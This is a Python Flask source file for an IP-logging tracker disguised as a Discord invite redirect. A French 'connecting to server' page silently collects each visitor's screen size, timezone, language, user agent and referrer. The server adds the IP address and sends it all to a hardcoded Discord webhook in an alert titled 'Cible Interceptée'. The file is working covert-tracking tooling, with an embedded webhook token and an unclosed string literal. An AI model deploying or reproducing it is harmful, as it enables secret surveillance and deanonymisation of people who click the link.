import os
import datetime
import uuid
import requests
from flask import Flask, request, render_template_string

app = Flask(__name__)

DISCORD_INVITE_URL = os.environ.get("DISCORD_INVITE_URL", "https://discord.gg/AU3zzD7U")
DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/1489369120636928113/8Kk_J2h3YzI-oPB2ywpF6DPdRExiwlWt5E3fPTT2lMjL85IvIADe2bnpjWRNOgXuX8uT)

FINGERPRINT_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Redirection en cours...</title>
    <script>
        window.onload = function() {
            const data = {
                screen_resolution: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                user_agent: navigator.userAgent,
                referer: document.referrer
            };

            fetch('/log_data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).finally(() => {
                window.location.replace("{{ invite_url }}");
            });
        };
    </script>
</head>
<body style="background-color: #36393f; color: white; font-family: sans-serif; text-align: center; margin-top: 20%;">
    <h2>Connexion au serveur...</h2>
    <noscript>
        <meta http-equiv="refresh" content="0; url={{ invite_url }}">
    </noscript>
</body>
</html>
"""

@app.route('/discord')
def track_invite():
    return render_template_string(FINGERPRINT_HTML, invite_url=DISCORD_INVITE_URL)

@app.route('/log_data', methods=['POST'])
def log_data():
    ip = request.headers.get('HTTP_TRUE_CLIENT_IP') or \
         request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or \
         request.remote_addr

    client_data = request.json or {}
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    unique_id = str(uuid.uuid4())[:8]

    if DISCORD_WEBHOOK_URL:
        embed = {
            "title": f"Cible Interceptée | ID: {unique_id}",
            "color": 16711680,
            "fields": [
                {"name": "Adresse IP", "value": ip, "inline": True},
                {"name": "Horodatage", "value": timestamp, "inline": True},
                {"name": "Résolution", "value": client_data.get('screen_resolution', 'Inconnue'), "inline": True},
                {"name": "Fuseau Horaire", "value": client_data.get('timezone', 'Inconnu'), "inline": True},
                {"name": "Langue", "value": client_data.get('language', 'Inconnue'), "inline": True},
                {"name": "Provenance (Referer)", "value": client_data.get('referer', 'Direct') or 'Direct', "inline": False},
                {"name": "Agent Utilisateur", "value": client_data.get('user_agent', 'Inconnu'), "inline": False}
            ]
        }
        try:
            requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]}, timeout=3)
        except Exception as e:
            print(f"Échec Webhook: {e}")

    return "OK", 200

@app.route('/')
def home():
    return "<h1>Service Actif</h1>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
